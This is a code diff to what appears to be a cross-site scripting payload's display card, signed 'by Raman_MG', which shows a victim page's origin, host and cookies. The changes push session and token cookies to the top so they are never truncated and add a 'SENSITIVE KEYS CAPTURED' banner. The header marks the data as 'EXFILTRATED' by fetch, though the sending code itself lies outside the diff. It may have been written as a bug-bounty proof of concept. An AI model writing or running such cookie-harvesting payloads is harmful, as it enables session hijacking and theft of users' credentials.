@@ -30,9 +30,16 @@
   const kvTable = obj => { const ks = Object.keys(obj); return ks.length
     ? ks.slice(0, 16).map(k => "<tr><td class='k" + (HOT.test(k) ? " hot" : "") + "'>" + enc(clip(k, 34)) + "</td><td class='v'>" + enc(clip(obj[k], 90)) + "</td></tr>").join("") + (ks.length > 16 ? "<tr><td class='k'></td><td class='v'>…+" + (ks.length - 16) + " more</td></tr>" : "")
     : "<tr><td class='v' style='color:#456'>— none —</td></tr>"; };
-  const ckTable = cookieList.length
-    ? cookieList.slice(0, 16).map(c => { const k = c.split("=")[0]; return "<tr><td class='k" + (HOT.test(k) ? " hot" : "") + "'>" + enc(clip(k, 34)) + "</td><td class='v'>" + enc(clip(c.slice(k.length + 1), 90)) + "</td></tr>"; }).join("") + (cookieList.length > 16 ? "<tr><td class='k'></td><td class='v'>…+" + (cookieList.length - 16) + " more</td></tr>" : "")
+  // Sort sensitive (session/token) cookies to the TOP so they're always shown (never truncated), and list them in a banner.
+  const hotCookieNames = cookieList.map(c => c.split("=")[0]).filter(k => HOT.test(k));
+  const cookiesSorted = cookieList.slice().sort((a, b) => (HOT.test(b.split("=")[0]) ? 1 : 0) - (HOT.test(a.split("=")[0]) ? 1 : 0));
+  const CK_SHOW = 20;
+  const ckTable = cookiesSorted.length
+    ? cookiesSorted.slice(0, CK_SHOW).map(c => { const k = c.split("=")[0]; const h = HOT.test(k); return "<tr><td class='k" + (h ? " hot" : "") + "'>" + enc(clip(k, 34)) + "</td><td class='v" + (h ? " hi" : "") + "'>" + enc(clip(c.slice(k.length + 1), 120)) + "</td></tr>"; }).join("") + (cookiesSorted.length > CK_SHOW ? "<tr><td class='k'></td><td class='v'>…+" + (cookiesSorted.length - CK_SHOW) + " more (non-sensitive)</td></tr>" : "")
     : "<tr><td class='v' style='color:#456'>— none —</td></tr>";
+  const hotBanner = hotCookieNames.length
+    ? "<div class='alert'>🔑 SENSITIVE KEYS CAPTURED: <b>" + enc(hotCookieNames.join(", ")) + "</b></div>"
+    : "";
 
   // ---- theme (switch with one word) ----
   const THEME = "neon-green"; // "neon-green" | "cyber" | "danger"
@@ -57,9 +64,11 @@
     + "tr:has(.hot) td{background:" + t.hot + "1a}td.k.hot{color:" + t.hot + ";text-shadow:0 0 8px " + t.hot + "aa}"
     + ".sec{color:#000;background:" + t.acc + ";font-weight:800;margin:10px 0 0;padding:5px 16px;letter-spacing:1px;box-shadow:0 0 16px " + t.glow + "77}"
     + ".sec em{float:right;font-style:normal;opacity:.85}"
-    + ".foot{color:" + t.val + ";font-size:11px;padding:12px 16px 14px;border-top:1px dashed " + t.acc + "55;margin-top:8px}.foot b{color:" + t.hot + ";text-shadow:0 0 6px " + t.hot + "88}</style>"
+    + ".foot{color:" + t.val + ";font-size:11px;padding:12px 16px 14px;border-top:1px dashed " + t.acc + "55;margin-top:8px}.foot b{color:" + t.hot + ";text-shadow:0 0 6px " + t.hot + "88}"
+    + ".alert{padding:9px 16px;background:" + t.hot + "22;border-bottom:1.5px solid " + t.hot + ";color:" + t.hi + ";font-weight:600;word-break:break-all}.alert b{color:" + t.hot + ";text-shadow:0 0 8px " + t.hot + "aa}</style>"
     + "<div class='card'>"
     + "<div class='head'><span>⚡ Wild XSS EXECUTED &nbsp;·&nbsp; by Raman_MG</span><span>" + (sent ? "◉ EXFILTRATED" : "◉ EXFIL (fetch)") + "</span></div>"
+    + hotBanner
     + "<table>"
     + "<tr><td class='k'>ORIGIN</td><td class='v hi'>" + enc(data.origin) + "</td></tr>"
     + "<tr><td class='k'>HOST</td><td class='v hi'>" + enc(data.host) + "</td></tr>"
